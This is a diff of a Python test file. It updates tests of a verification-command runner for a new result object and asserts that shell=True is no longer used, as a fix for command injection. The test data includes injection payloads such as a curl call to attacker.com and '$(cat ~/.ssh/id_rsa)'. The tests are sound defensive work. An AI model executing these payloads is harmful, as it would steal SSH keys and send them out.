@@ -43,6 +43,10 @@ from continuous_iteration import (
     ROOT,
     STATE_DIR,
     AGENTS_FILE,
+    CommandResult,
+    VerifyCommandsResult,
+    CommandExecutionError,
+    InvalidCommandError,
 )
 
 
@@ -306,7 +310,10 @@ class TestRunVerifyCommands:
         """Test running with empty command list."""
         result = run_verify_commands([], "test-spec")
 
-        assert result == []
+        assert isinstance(result, VerifyCommandsResult)
+        assert result.commands_run == 0
+        assert result.all_success is True
+        assert result.results == []
 
     def test_run_verify_commands_single_success(self) -> None:
         """Test running a single successful verification command."""
@@ -318,12 +325,16 @@ class TestRunVerifyCommands:
         with patch("subprocess.run", return_value=mock_proc):
             result = run_verify_commands(["echo {spec}"], "test-spec")
 
-        assert len(result) == 1
-        assert result[0]["returncode"] == 0
-        assert result[0]["stdout"] == "test output"
+        assert isinstance(result, VerifyCommandsResult)
+        assert result.commands_run == 1
+        assert result.all_success is True
+        assert len(result.results) == 1
+        assert result.results[0].success is True
+        assert result.results[0].exit_code == 0
+        assert result.results[0].stdout == "test output"
         # Command should have spec placeholder replaced
-        assert "{spec}" not in result[0]["command"]
-        assert "test-spec" in result[0]["command"]
+        assert "{spec}" not in result.results[0].command
+        assert "test-spec" in result.results[0].command
 
     def test_run_verify_commands_multiple_commands(self) -> None:
         """Test running multiple verification commands."""
@@ -340,9 +351,12 @@ class TestRunVerifyCommands:
         with patch("subprocess.run", side_effect=[mock_proc1, mock_proc2]):
             result = run_verify_commands(["echo test1", "echo test2"], "test-spec")
 
-        assert len(result) == 2
-        assert result[0]["stdout"] == "output1"
-        assert result[1]["stdout"] == "output2"
+        assert isinstance(result, VerifyCommandsResult)
+        assert result.commands_run == 2
+        assert result.all_success is True
+        assert len(result.results) == 2
+        assert result.results[0].stdout == "output1"
+        assert result.results[1].stdout == "output2"
 
     def test_run_verify_commands_failure_stops_execution(self) -> None:
         """Test that command execution stops on first failure."""
@@ -365,9 +379,13 @@ class TestRunVerifyCommands:
             result = run_verify_commands(["cmd1", "cmd2", "cmd3"], "test-spec")
 
         # Should only have results for first two commands
-        assert len(result) == 2
-        assert result[0]["returncode"] == 0
-        assert result[1]["returncode"] == 1
+        assert isinstance(result, VerifyCommandsResult)
+        assert result.commands_run == 2
+        assert result.all_success is False
+        assert result.stopped_at == 1
+        assert len(result.results) == 2
+        assert result.results[0].exit_code == 0
+        assert result.results[1].exit_code == 1
 
     def test_run_verify_commands_spec_placeholder_replacement(self) -> None:
         """Test that {spec} placeholder is replaced in commands."""
@@ -379,18 +397,22 @@ class TestRunVerifyCommands:
         with patch("subprocess.run", return_value=mock_proc):
             result = run_verify_commands(["test command for {spec}"], "my-spec")
 
-        assert len(result) == 1
-        assert result[0]["command"] == "test command for my-spec"
+        assert isinstance(result, VerifyCommandsResult)
+        assert result.commands_run == 1
+        assert len(result.results) == 1
+        assert result.results[0].command == "test command for my-spec"
 
     def test_run_verify_commands_shell_injection_risk(self) -> None:
         """
-        TEST: Demonstrates command injection vulnerability via shell=True.
+        TEST: Verifies that shell=True is NOT used (vulnerability is fixed).
 
-        This test documents the vulnerability where user-provided commands
-        are executed with shell=True, allowing command injection.
+        This test verifies that the command injection vulnerability has been
+        fixed by ensuring that shell=True is NOT used when executing commands.
+        The implementation now uses shlex.split() for safe argument parsing
+        instead of shell=True.
 
-        The spec parameter could contain malicious shell metacharacters
-        that would be executed when the command is run.
+        The spec parameter could contain malicious shell metacharacters,
+        but they should NOT be executed because we don't use shell=True.
         """
         mock_proc = MagicMock()
         mock_proc.returncode = 0
@@ -403,13 +425,15 @@ class TestRunVerifyCommands:
         with patch("subprocess.run", return_value=mock_proc) as mock_run:
             result = run_verify_commands(["echo {spec}"], malicious_spec)
 
-            # Verify that the command was executed with shell=True
+            # Verify the command was called
             assert mock_run.called
+            # Verify that shell=True is NOT used (vulnerability is fixed)
             call_kwargs = mock_run.call_args[1]
-            assert call_kwargs.get("shell") is True
+            assert call_kwargs.get("shell") is None or call_kwargs.get("shell") is False
 
-            # The malicious command is present in the rendered command
-            assert "; echo" in result[0]["command"]
+            # The malicious command is present in the rendered command string
+            # (but won't be executed because we're not using shell=True)
+            assert "; echo" in result.results[0].command
 
     def test_run_verify_commands_command_injection_with_malicious_spec(self) -> None:
         """
@@ -500,17 +524,18 @@ class TestRunVerifyCommands:
                     malicious_spec
                 )
 
-                # Verify the vulnerability
-                assert len(result) == 1, f"Failed for payload: {description}"
+                # Verify the fix is in place
+                assert len(result.results) == 1, f"Failed for payload: {description}"
 
-                # Verify shell=True is used (enables the injection)
+                # Verify shell=True is NOT used (vulnerability is fixed)
                 assert mock_run.called, f"subprocess.run not called for: {description}"
                 call_kwargs = mock_run.call_args[1]
-                assert call_kwargs.get("shell") is True, \
-                    f"shell=True not set for: {description}"
+                assert call_kwargs.get("shell") is None or call_kwargs.get("shell") is False, \
+                    f"shell=True should not be set for: {description} (vulnerability should be fixed)"
 
-                # Verify the malicious payload is present in the rendered command
-                rendered_command = result[0]["command"]
+                # Verify the malicious payload is still in the rendered command string
+                # (but won't be executed because we're not using shell=True)
+                rendered_command = result.results[0].command
                 assert expected_substring in rendered_command, \
                     f"Malicious payload '{expected_substring}' not found in command: {rendered_command}"
 
@@ -556,22 +581,24 @@ class TestRunVerifyCommands:
 
             results = run_verify_commands(verify_commands, attacker_spec)
 
-            # Both commands would be vulnerable
-            assert len(results) == 2
+            # Both commands should run
+            assert len(results.results) == 2
 
-            # Verify both calls used shell=True
+            # Verify shell=True is NOT used (vulnerability is fixed)
             assert mock_run.call_count == 2
             for call in mock_run.call_args_list:
                 kwargs = call[1]
-                assert kwargs.get("shell") is True, "shell=True enables injection"
+                assert kwargs.get("shell") is None or kwargs.get("shell") is False, \
+                    "shell=True should NOT be set (vulnerability should be fixed)"
 
-            # Verify the exfiltration payload is present in both commands
-            assert "curl http://attacker.com" in results[0]["command"]
-            assert "curl http://attacker.com" in results[1]["command"]
+            # Verify the exfiltration payload is still in the rendered command strings
+            # (but won't be executed because we're not using shell=True)
+            assert "curl http://attacker.com" in results.results[0].command
+            assert "curl http://attacker.com" in results.results[1].command
 
             # Verify command substitution payload is present
-            assert "$(cat ~/.ssh/id_rsa)" in results[0]["command"]
-            assert "$(cat ~/.ssh/id_rsa)" in results[1]["command"]
+            assert "$(cat ~/.ssh/id_rsa)" in results.results[0].command
+            assert "$(cat ~/.ssh/id_rsa)" in results.results[1].command
 
 
 # ============================================================================
